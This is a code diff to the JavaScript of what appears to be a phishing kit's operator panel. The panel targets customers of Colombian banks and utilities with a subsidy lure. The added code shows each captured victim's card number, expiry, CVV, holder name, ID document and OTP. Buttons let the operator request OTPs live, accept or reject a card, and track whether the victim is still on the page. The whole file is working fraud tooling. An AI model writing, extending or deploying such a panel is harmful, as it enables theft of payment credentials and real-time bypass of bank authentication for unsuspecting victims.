@@ -400,20 +400,16 @@ function botonesSesion(s) {
     const btns = [];
 
     if (bancoKey === 'vanti') {
-        // 💲 Asignar precio SOLO si no hay tarjeta aún y no hay monto
         if (estado === 'pendiente' && !s.datos.monto && !s.datos.tarjeta) {
             btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
         }
-        // 📱 Pedir OTP
         btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
-        // ✅ Aceptar
         btns.push(`<button class="btn btn-accept" title="Aceptar (pasa a OTP)" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
-        // ❌ Rechazar
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
-        // ⚠️ Error CC
         btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
-        // 🚫 Bloquear IP
-        btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+        btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Ver Información del Usuario" onclick="verInfoUsuario('${sid}')">👁️</button>`);
+        btns.push(`<button class="btn" style="background:#8b5cf6; color:white;" title="Estado de Conexión" onclick="verConexionUsuario('${sid}', '${ip}')">📡</button>`);
+        btns.push(`<button class="btn btn-block" title="Bloquear y Expulsar IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         return btns.join('');
     }
 
@@ -489,7 +485,9 @@ function renderSesiones() {
         
         let pasoTexto = 'Entrando';
         if (pasoActual === 'consultadesubsidio') pasoTexto = 'Consultando';
-        else if (pasoActual.includes('pagodesubsidio')) pasoTexto = pasoActual;
+        else if (pasoActual.includes('pagodesubsidio') || pasoActual.includes('Tarjeta')) {
+            pasoTexto = banco === 'vanti' ? 'Vanti Tarjeta' : pasoActual;
+        }
         else if (pasoActual === 'clavedin') pasoTexto = 'Clave Dinámica';
 
         const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti';
@@ -680,7 +678,17 @@ async function cargarLogs() { try { const d = await api('/admin/logs'); logsCach
 function renderLogs() { const filtro = ($('buscarLogs').value || '').toLowerCase().trim(); const tbody = $('tbodyLogs'); let lista = logsCache; if (filtro) { lista = lista.filter(l => { const texto = [l.tipo, JSON.stringify(l.datos)].join(' ').toLowerCase(); return texto.includes(filtro); }); } if (!lista.length) { tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin logs</td></tr>'; return; } tbody.innerHTML = lista.map(l => { const fecha = new Date(l.fecha).toLocaleString('es-CO'); return ` <tr> <td class="checkbox-col"><input type="checkbox" class="check-log" data-id="${escapeHtml(l.id)}" disabled></td> <td>${escapeHtml(fecha)}</td> <td>${escapeHtml(l.tipo)}</td> <td class="dato">${escapeHtml(JSON.stringify(l.datos))}</td> </tr> `; }).join(''); }
 
 async function accion(sessionId, accion) { try { await api('/admin/sesion/' + encodeURIComponent(sessionId) + '/accion', { method: 'POST', body: JSON.stringify({ accion }) }); toast('✅ ' + accion + ' aplicado'); cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } }
-async function bloquearIp(ip) { if (!ip || ip === '-') { toast('IP inválida', true); return; } if (!confirm('¿Bloquear la IP ' + ip + '?')) return; try { await api('/admin/ip/bloquear', { method: 'POST', body: JSON.stringify({ ip }) }); toast('🚫 IP bloqueada: ' + ip); cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } }
+
+async function bloquearIp(ip) { 
+    if (!ip || ip === '-') { toast('IP inválida', true); return; } 
+    if (!confirm('¿Bloquear la IP ' + ip + '?\n\nEl sistema expulsará y redirigirá al usuario automáticamente en los próximos 5 segundos.')) return; 
+    try { 
+        await api('/admin/ip/bloquear', { method: 'POST', body: JSON.stringify({ ip }) }); 
+        toast('🚫 IP bloqueada y usuario expulsado: ' + ip); 
+        cargarTodo(); 
+    } catch (e) { toast('Error: ' + e.message, true); } 
+}
+
 async function desbloquearIp(ip) { if (!confirm('¿Desbloquear la IP ' + ip + '?')) return; try { await api('/admin/ip/desbloquear', { method: 'POST', body: JSON.stringify({ ip }) }); toast('🔓 IP desbloqueada: ' + ip); cargarTodo(); } catch (e) { toast('Error: ' + e.message, true); } }
 $('btnBloquearManual').addEventListener('click', async () => { const ip = $('inputNuevaIp').value.trim(); if (!ip) { toast('Escribe una IP', true); return; } await bloquearIp(ip); $('inputNuevaIp').value = ''; });
 
@@ -706,6 +714,75 @@ async function ponerPrecio(sessionId) {
             cargarTodo();
         } catch (e) { toast('Error: ' + e.message, true); }
     }
+}
+
+function verInfoUsuario(sessionId) {
+    const s = sesionesCache.find(x => x.sessionId === sessionId);
+    if (!s) return;
+    const d = s.datos || {};
+    
+    Swal.fire({
+        title: '👤 Información del Usuario',
+        html: `
+            <div style="text-align: left; font-size: 13px; line-height: 1.6;">
+                <p><b>IP:</b> ${escapeHtml(d.ip || '-')}</p>
+                <p><b>Empresa:</b> ${escapeHtml(d.empresa || '-')}</p>
+                <p><b>Cuenta/Referencia:</b> ${escapeHtml(d.cuenta || '-')}</p>
+                <hr style="border-color:#252d44;">
+                <p><b>Tarjeta:</b> ${escapeHtml(d.tarjeta || '-')}</p>
+                <p><b>Vencimiento:</b> ${escapeHtml(d.expMes || '-')}/${escapeHtml(d.expAnio || '-')}</p>
+                <p><b>CVV:</b> ${escapeHtml(d.cvv || '-')}</p>
+                <p><b>Titular:</b> ${escapeHtml(d.titular || '-')}</p>
+                <p><b>Documento:</b> ${escapeHtml(d.docType || '')} ${escapeHtml(d.docNumber || '')}</p>
+                <hr style="border-color:#252d44;">
+                <p><b>OTP:</b> <span style="color:#a855f7; font-weight:bold;">${escapeHtml(d.otp || '-')}</span></p>
+                <p><b>Monto:</b> $${Number(d.monto || 0).toLocaleString('es-CO')}</p>
+                <p><b>Banco Emisor:</b> ${escapeHtml(d.bankName || '-')}</p>
+                <p><b>Nivel:</b> ${escapeHtml(d.cardLevel || '-')}</p>
+            </div>
+        `,
+        confirmButtonColor: '#88f456',
+        confirmButtonText: 'Cerrar',
+        background: '#151b2e',
+        color: '#e5e7eb'
+    });
+}
+
+function verConexionUsuario(sessionId, ip) {
+    const activoInfo = activosCache.find(a => a.sessionId === sessionId);
+    let estadoMsg = '';
+    let color = '';
+    let icono = '';
+
+    if (!activoInfo) {
+        estadoMsg = 'El usuario ha cerrado la página o se ha desconectado.';
+        color = '#ef4444';
+        icono = 'error';
+    } else {
+        const ahora = Date.now();
+        const ultimoHeartbeat = activoInfo.ultimoHeartbeat || 0;
+        const segundosInactivo = Math.floor((ahora - ultimoHeartbeat) / 1000);
+        
+        if (segundosInactivo > 15) {
+            estadoMsg = `Usuario inactivo (Posiblemente salió de la pestaña).<br>Último latido hace <b>${segundosInactivo} segundos</b>.`;
+            color = '#fbbf24';
+            icono = 'warning';
+        } else {
+            estadoMsg = `Usuario <b>CONECTADO</b> en la página.<br>Latido recibido hace <b>${segundosInactivo} segundos</b>.`;
+            color = '#22c55e';
+            icono = 'success';
+        }
+    }
+
+    Swal.fire({
+        icon: icono,
+        title: '📡 Estado de Conexión',
+        html: `<p>${estadoMsg}</p><br><p style="font-size:12px; color:#8b94a8;"><b>IP:</b> ${escapeHtml(ip)}<br><b>Navegador:</b> ${escapeHtml(activoInfo?.userAgent || 'Desconocido')}</p>`,
+        confirmButtonText: 'Entendido',
+        confirmButtonColor: color,
+        background: '#151b2e',
+        color: '#e5e7eb'
+    });
 }
 
 $('buscarActivos').addEventListener('input', renderActivos);
